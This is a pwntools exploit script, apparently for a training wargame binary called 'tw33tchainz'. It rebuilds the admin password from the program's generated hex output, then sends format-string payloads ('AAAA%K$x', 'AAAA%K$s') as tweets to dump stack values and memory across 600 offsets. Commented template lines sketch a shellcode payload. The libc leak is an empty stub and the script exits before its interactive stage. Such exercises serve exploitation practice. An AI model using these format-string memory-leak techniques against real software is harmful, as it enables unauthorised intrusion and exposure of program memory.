#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template tw33tchainz
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('tw33tchainz')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x{exe.symbols.main:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x8048000)
# RWX:      Has RWX segments

context.terminal = ["xfce4-terminal", "-e"]
username = "\x00" * 0x0f
salt     = "\x00" * 0x0f

libc =  ELF("/usr/lib32/libc.so.6")
rop  =  ROP(libc)

def do_tweet(msg):
    io.recvuntil("Enter Choice: ")
    io.sendline("1")
    io.recvuntil("Enter tweet data (16 bytes): ")
    io.sendline(msg)
    io.recvuntil("Please do not try to lop off our birdies heads :(\n")
    io.sendline()
    log.info("Tweeted: " + msg)

def get_admin(password):
    io.recvuntil("Enter Choice: ")
    io.sendline("3")
    io.recvuntil("Enter password: ")
    io.sendline(password)
    recv = io.recvline()
    log.info(recv)

    if "Nope" in recv:
        return False
    return True

def leak_libc():
    pass

data = []

for K in range(1, 600):
    while True:
        io = start()
        io.recvuntil("Enter Username: \n")
        io.send(username)
        io.recvuntil("Enter Salt: \n")
        io.sendline(salt)
        io.recvuntil("Generated Password:\n")
        password = io.recvline().lstrip().rstrip()

        log.info("Got password: " + password)

        secret = ''
        for elem in [password[i:i+8] for i in range(0, len(password), 8)]:
            secret += p32(int(elem, 16))
        log.info("Recovered: " + secret)

        if not get_admin(secret):
            io.close()
            continue

        to_add = ["deadbeef", "deadbeef"]

        do_tweet("AAAA%{}$x".format(K))
        io.recvuntil("View Chainz")
        io.recvuntil("AAAA")
        r = io.recvline().rstrip().lstrip()
        indx = r.index("\xcc")

        to_add[0] = r[:indx]

        try:
            do_tweet("AAAA%{}$s".format(K))
            io.recvuntil("View Chainz")
            io.recvuntil("AAAA")
            r = io.recvline().rstrip().lstrip()
            indx = r.index("\xcc")

            to_add[1] = r[:indx]
        except:
            to_add[1] = "invalid addr"

        data.append(to_add)
        io.close()
        break

for (i, dump) in enumerate(data):
    addr = dump[0]
    point = dump[1]
    print ("{} | {} ({}) -> {}".format(i + 1, addr, p32(int(addr, 16)), point))

exit()
# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

